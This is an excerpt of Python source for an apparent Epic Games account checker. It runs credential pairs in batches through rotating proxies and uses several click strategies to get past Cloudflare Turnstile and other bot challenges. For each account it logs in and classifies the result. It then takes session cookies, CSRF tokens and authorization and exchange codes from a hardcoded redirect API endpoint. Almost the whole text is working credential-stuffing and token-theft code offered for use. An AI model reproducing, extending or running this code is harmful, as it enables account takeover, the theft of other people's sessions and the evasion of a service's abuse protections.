...
class AccountCheckerCF:
    ...
    async def get_or_launch_browser(self, proxy_line: Optional[str]) -> Any:
        ...
        try:
            ...
            logger.error(f"❌ Failed to launch browser with proxy {proxy_line}: {e}")
            # Try without proxy as fallback
            if proxy_dict:
                logger.info(f"🔄 Retrying browser launch without proxy...")
                try:
                    browser = await self.playwright.chromium.launch(
                        headless=HEADLESS,
                        args=browser_args,
                    ...
                    fallback_key = f"__noproxy___{PREFERRED_BROWSER_TYPE}"
                    self.browser_pool[fallback_key] = browser
                    return browser
                except Exception as fallback_error:
                    logger.error(f"❌ Fallback browser launch also failed: {fallback_error}")
            raise e
    ...
    async def solve_turnstile_challenge(self, page: Any, url: str, sitekey: str) -> Dict[str, Any]:
        ...
        try:
            ...
            if DEBUG_ENHANCED_FEATURES:
                logger.info("🎯 Setting up Turnstile widget dimensions")
            ...
            if DEBUG_ENHANCED_FEATURES:
                logger.info("🔄 Starting Turnstile response retrieval loop")
            ...
            for attempt in range(15):  # Increased attempts
                try:
                    ...
                    if turnstile_check == "":
                        if DEBUG_ENHANCED_FEATURES:
                            logger.info(f"🔄 Attempt {attempt + 1} - No Turnstile response yet")
                        ...
                        if DEBUG_ENHANCED_FEATURES:
                            logger.info(f"✅ Advanced Turnstile solved: {turnstile_check[:10]}... in {elapsed_time}s")
                    ...
                    if DEBUG_ENHANCED_FEATURES:
                        logger.info(f"⚠️ Attempt {attempt + 1} error: {str(e)}")
                    continue
    ...
    async def handle_cloudflare_challenge(self, page: Any, email: str):
        ...
        try:
            if DEBUG_ENHANCED_FEATURES:
                logger.info(f"🛡️ Enhanced Cloudflare challenge handling for {email}")
            ...
            try:
                ...
                if sitekey_element:
                    ...
                    if sitekey:
                        if DEBUG_ENHANCED_FEATURES:
                            logger.info(f"🔑 Found sitekey: {sitekey}, attempting advanced Turnstile solve")
                        
                        # Use advanced Turnstile solver
                        result = await self.solve_turnstile_challenge(page, page.url, sitekey)
                        if result['success']:
                            logger.info(f"✅ {email} - Advanced Turnstile solved successfully!")
                            return True
                        else:
                            logger.info(f"⚠️ {email} - Advanced Turnstile solve failed: {result.get('error', 'Unknown error')}")
            except Exception as e:
                if DEBUG_ENHANCED_FEATURES:
                    logger.info(f"⚠️ Sitekey detection failed: {e}")
            
            # Fallback to enhanced traditional challenge handling
            logger.info(f"🤖 {email} - Attempting enhanced traditional challenge interaction...")
            ...
            logger.info(f"🤖 {email} - Attempting to interact with Cloudflare challenge...")
            ...
            for selector in challenge_selectors:
                try:
                    ...
                    if count > 0:
                        logger.info(f"🎯 {email} - Found challenge element: {selector}")
                        ...
                        try:
                            ...
                            logger.info(f"✅ {email} - Clicked challenge element successfully")
                            interaction_success = True
                        except Exception as click_error:
                            logger.info(f"⚠️ {email} - Direct click failed: {click_error}")
                        
                        # Method 2: Force click if direct click failed
                        if not interaction_success:
                            try:
                                await elements.first.click(force=True, timeout=5000)
                                logger.info(f"✅ {email} - Force clicked challenge element")
                                interaction_success = True
                            except Exception as force_error:
                                logger.info(f"⚠️ {email} - Force click failed: {force_error}")
                        
                        # Method 3: JavaScript click if other methods failed
                        if not interaction_success:
                            try:
                                await elements.first.evaluate("element => element.click()")
                                logger.info(f"✅ {email} - JavaScript clicked challenge element")
                                interaction_success = True
                            except Exception as js_error:
                                logger.info(f"⚠️ {email} - JavaScript click failed: {js_error}")
                        
                        if interaction_success:
                            # Wait for challenge to process
                            logger.info(f"⏳ {email} - Waiting for challenge to process...")
                            ...
                            try:
                                ...
                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                    logger.info(f"🎉 {email} - Challenge appears to be resolved!")
                                    return True
                            except:
                                pass
            ...
            logger.info(f"🔍 {email} - Trying enhanced iframe-based challenge interaction...")
            ...
            for selector in iframe_selectors:
                try:
                    ...
                    if iframe_count > 0:
                        logger.info(f"🎯 {email} - Found {iframe_count} iframe(s) with selector: {selector}")
                        ...
                        for i in range(iframe_count):
                            try:
                                ...
                                if is_cf_iframe or selector == "iframe":  # Try all iframes as fallback
                                    logger.info(f"🎯 {email} - Attempting to interact with iframe: {src[:50] if src else 'no src'}...")
                                    ...
                                    try:
                                        ...
                                        if box and box['width'] > 0 and box['height'] > 0:
                                            ...
                                            logger.info(f"🖱️ {email} - Clicking iframe at ({click_x:.0f}, {click_y:.0f})")
                                            ...
                                            logger.info(f"✅ {email} - Clicked on Cloudflare iframe")
                                            ...
                                            try:
                                                title = await page.title()
                                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                                    logger.info(f"🎉 {email} - Challenge resolved after iframe click!")
                                                    return True
                                            except:
                                                pass
                                        ...
                                        logger.info(f"⚠️ {email} - Iframe click failed: {iframe_error}")
                                        continue
                                    ...
                                    try:
                                        ...
                                        logger.info(f"✅ {email} - Attempted keyboard interaction with iframe")
                                        return True
                                        
                                    except Exception as keyboard_error:
                                        logger.info(f"⚠️ {email} - Keyboard interaction failed: {keyboard_error}")
                                        continue
                                        
                            except Exception as iframe_iteration_error:
                                logger.info(f"⚠️ {email} - Error processing iframe {i}: {iframe_iteration_error}")
                                continue
                                
                except Exception as selector_error:
                    logger.info(f"⚠️ {email} - Error with selector {selector}: {selector_error}")
                    continue
            
            logger.info(f"⚠️ {email} - No interactive challenge elements found")
            return False
            
        except Exception as e:
            logger.info(f"❌ {email} - Error in challenge handler: {e}")
            return False
    ...
    async def detect_outcome_and_extract_auth(self, page: Page, email: str) -> Tuple[AccountStatus, Dict[str, Any]]:
        ...
        try:
            ...
            logger.info(f"🔍 {email} - Analyzing page: {current_url}")
            ...
            if any(url in current_url for url in success_urls):
                logger.info(f"✅ {email} - Success detected by URL: {current_url}")
            ...
            for indicator in success_indicators:
                if indicator.lower() in page_text:
                    logger.info(f"✅ {email} - Success detected by content: {indicator}")
                    auth_code = await self.extract_auth_code(page, email)
            ...
            for indicator in twofa_indicators:
                if indicator in page_text:
                    logger.info(f"🔐 {email} - 2FA detected: {indicator}")
            ...
            try:
                ...
                for selector, captcha_type in captcha_checks:
                    ...
                    if count > 0:
                        logger.info(f"🤖 {email} - Captcha detected: {captcha_type}")
            ...
            for indicator in invalid_indicators:
                if indicator in page_text:
                    logger.info(f"❌ {email} - Invalid credentials detected: {indicator}")
                    ...
                    if error_elements > 0:
                        ...
                        if error_text:
                            ...
                            if any(word in error_lower for word in ["credential", "invalid", "incorrect", "password", "email"]):
                                logger.info(f"❌ {email} - Error element detected: {error_text[:100]}")
                                return AccountStatus.INVALID, {
            ...
            logger.info(f"⚠️ {email} - Unable to determine outcome, URL: {current_url}")
            ...
            logger.info(f"❌ {email} - Error in outcome detection: {str(e)}")
            return AccountStatus.ERROR, {
    ...
    async def extract_auth_code(self, page: Page, email: str) -> Optional[str]:
        ...
        try:
            logger.info(f"🔑 {email} - Attempting to extract auth code...")
            ...
            for cookie in cookies:
                ...
                if cookie['name'] in ['EPIC_BEARER_TOKEN', 'EPIC_SESSION_AP', 'EPIC_SESSION', 'epic_session']:
                    logger.info(f"🔑 {email} - Found auth token in cookies: {cookie['name']}")
                    return cookie['value']
            ...
            try:
                ...
                if local_storage:
                    logger.info(f"🔑 {email} - Found auth data in localStorage: {list(local_storage.keys())}")
            ...
            if "access_token=" in current_url:
                ...
                if token_match:
                    logger.info(f"🔑 {email} - Found access token in URL")
            ...
            logger.info(f"⚠️ {email} - No auth code found, but login was successful")
            return None
    ...
    async def fetch_account_details(self, auth_code: Optional[str], page: Page, email: str) -> Dict[str, Any]:
        ...
        try:
            ...
            # 2) Get CSRF token and extract account info via proper Epic Games API
            try:
                ...
                csrf_token = await page.evaluate(
                    ...
                    () => {
                        try {
                            ...
                            if (!token && window._token) token = window._token;
                            if (!token && window.xsrfToken) token = window.xsrfToken;
                            ...
                            if (!token) {
                                ...
                                for (let cookie of cookies) {
                                    ...
                                    if (name === 'XSRF-TOKEN' || name === 'csrf_token' || name === '_token') {
                ...
                logger.info(f"🔐 {email} - CSRF token: {'Found' if csrf_token else 'Not found'}")
                
                # Now make the API call with proper headers including CSRF token
                api_headers = {
                ...
                # Get account info via Epic's verify API
                ...
                if verify_resp.get('ok') and isinstance(verify_resp.get('data'), dict):
                    ...
                    logger.info(f"✅ {email} - Account info extracted successfully")
                else:
                    logger.info(f"⚠️ {email} - API verify failed: {verify_resp.get('status')} - {verify_resp.get('error') or verify_resp.get('raw', '')[:100]}")
                    # Still mark as having Epic account since login was successful
                    account_info['account_data']['hasEpicAccount'] = True
                    
            except Exception as e:
                logger.info(f"⚠️ {email} - Account info extraction failed: {e}")
                # Still mark as having Epic account since login was successful
                account_info['account_data']['hasEpicAccount'] = True

            # 2b) Extract authorization code from Epic Games redirect API
            authorization_code = None
            
            # Navigate to Epic Games redirect API to get authorization code
            try:
                redirect_url = "https://www.epicgames.com/id/api/redirect?clientId=007c0bfe154c4f5396648f013c641dcf&responseType=code"
                logger.info(f"🔑 {email} - Navigating to redirect API to get authorization code...")
                
                await page.goto(redirect_url, wait_until='domcontentloaded', timeout=30000)
                await asyncio.sleep(2)
                
                # Get the JSON response from the page
                redirect_response = await page.evaluate(
                    """
                    () => {
                        try {
                            // Try to get JSON from page content
                            const bodyText = document.body.innerText || document.body.textContent;
                            if (bodyText) {
                                try {
                                    return JSON.parse(bodyText);
                                } catch(e) {
                                    return { error: 'Not JSON', content: bodyText };
                                }
                            }
                ...
                if redirect_response and not redirect_response.get('error'):
                    logger.info(f"🔑 {email} - Redirect API response: {redirect_response}")
                    
                    # Extract authorization code from response
                    auth_code = redirect_response.get('authorizationCode')
                    if auth_code:
                        authorization_code = auth_code
                        logger.info(f"✅ {email} - Authorization code extracted: {auth_code[:20]}...")
                        
                        # Store additional data from redirect response
                        account_info['account_data'].update({
                            'authorization_code': auth_code,
                            'redirect_url': redirect_response.get('redirectUrl'),
                            'exchange_code': redirect_response.get('exchangeCode'),
                            'sid': redirect_response.get('sid'),
                            'sso_v2_enabled': redirect_response.get('ssoV2Enabled')
                        })
                    else:
                        logger.info(f"❌ {email} - No authorization code in redirect response")
                else:
                    logger.info(f"❌ {email} - Redirect API failed: {redirect_response}")
                    
            except Exception as e:
                logger.info(f"❌ {email} - Authorization code extraction failed: {e}")
            
            # Store the authorization code if found
            if authorization_code:
                account_info['account_data']['authorization_code'] = authorization_code
                logger.info(f"✅ {email} - Stored authorization code: {authorization_code[:20]}...")
            else:
            ...
            logger.info(f"❌ {email} - Error during account details extraction: {str(e)}")
    ...
    async def check_account(self, email: str, password: str, proxy: str = None) -> Tuple[AccountStatus, Dict[str, Any]]:
        ...
        async with self.semaphore:
            logger.info(f"🔍 Checking Epic Games account: {email}")
            
            # Optimized proxy selection
            if proxy:
                logger.info(f"🌐 {email} - Using provided proxy: {proxy[:20]}...")
                proxy_str = proxy
            else:
                proxy_str = self.get_proxy_for_check()
                if proxy_str:
                    logger.info(f"🌐 {email} - Using pool proxy: {proxy_str[:20]}...")
                else:
                    logger.info(f"🚫 {email} - No proxies uploaded, using direct connection")
            ...
            try:
                ...
                try:
                    ...
                    logger.info(f"🔍 {email} - Checking for security challenges...")
                    ...
                    if challenge_handled:
                        logger.info(f"🎉 {email} - Initial challenge handled successfully!")
                    ...
                    for selector in cf_indicators:
                        try:
                            count = await page.locator(selector).count()
                            if count > 0:
                                logger.info(f"🤖 {email} - Security challenge detected ({selector}), attempting bypass...")
                    ...
                    if challenge_detected:
                        logger.info(f"⏳ {email} - Waiting for challenge to resolve...")
                        ...
                        for attempt in range(45):
                            ...
                            try:
                                ...
                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge', 'security check']):
                                    ...
                                    logger.info(f"✅ {email} - Challenge resolved (title check)!")
                                    break
                            except:
                                pass
                            ...
                            if 'login' in current_url and 'epicgames.com' in current_url:
                                ...
                                try:
                                    ...
                                    if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                        challenge_resolved = True
                                        logger.info(f"✅ {email} - Challenge bypassed successfully!")
                                        break
                                except:
                                    pass
                            ...
                            if not still_challenged:
                                challenge_resolved = True
                                logger.info(f"✅ {email} - Challenge resolved (element check)!")
                                break
                            ...
                            try:
                                ...
                                logger.info(f"⚠️ {email} - Error handling Cloudflare challenge: {cf_error}")
                                pass
                        
                        if not challenge_resolved:
                            # Challenge didn't resolve in time
                            logger.info(f"❌ {email} - Challenge timeout after 45 seconds")
                    ...
                    try:
                        ...
                        if any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge', 'security check']):
                            logger.info(f"🤖 {email} - Persistent challenge in title: {title}")
                        ...
                        if any(indicator in current_url for indicator in ['challenge', 'captcha', 'verify']):
                            logger.info(f"🤖 {email} - Challenge detected in URL: {current_url}")
                    ...
                    logger.info(f"⚠️ {email} - Error checking for challenges: {e}")
                    pass
                ...
                logger.info(f"📧 {email} - Filling email...")
                ...
                logger.info(f"🔐 {email} - Filling password...")
                ...
                logger.info(f"🚀 {email} - Submitting login...")
                ...
                logger.info(f"✅ {email} - Result: {status.value} - {details.get('message', 'Success')}")
                ...
                if "Connection closed" in error_msg or "pipe" in error_msg.lower():
                    logger.warning(f"🔌 {email} - Browser connection lost: {error_msg}")
                    # Try to cleanup and restart browser for next account
                    try:
                        if context:
                            await context.close()
                    except:
                        pass
                    return AccountStatus.ERROR, {'error': 'Browser connection lost - will retry with fresh browser'}
                else:
                    logger.info(f"❌ {email} - Error during check: {error_msg}")
                    return AccountStatus.ERROR, {'error': error_msg}
    ...
    async def check_accounts_batch(self, accounts: List[Tuple[str, str]], progress_callback=None) -> Dict[str, List[Tuple[str, str, Dict[str, Any]]]]:
        ...
        async def check_with_progress_and_delay(i, account):
            ...
            if i > 0:  # No delay for first account
                ...
                if DEBUG_ENHANCED_FEATURES:
                    logger.info(f"⏱️ Intelligent delay: {delay:.1f}s before checking {email}")
            ...
            try:
                ...
                logger.info(f"❌ Batch check error for {email}: {e}")
        ...
        try:
            ...
            try:
                ...
                if DEBUG_ENHANCED_FEATURES:
                    logger.info(f"🧹 Final cleanup completed after batch of {total_accounts} accounts")
            except:
                pass
    ...
    async def close(self):
        ...
        if DEBUG_ENHANCED_FEATURES:
            logger.info("🧹 Enhanced cleanup completed - all resources freed")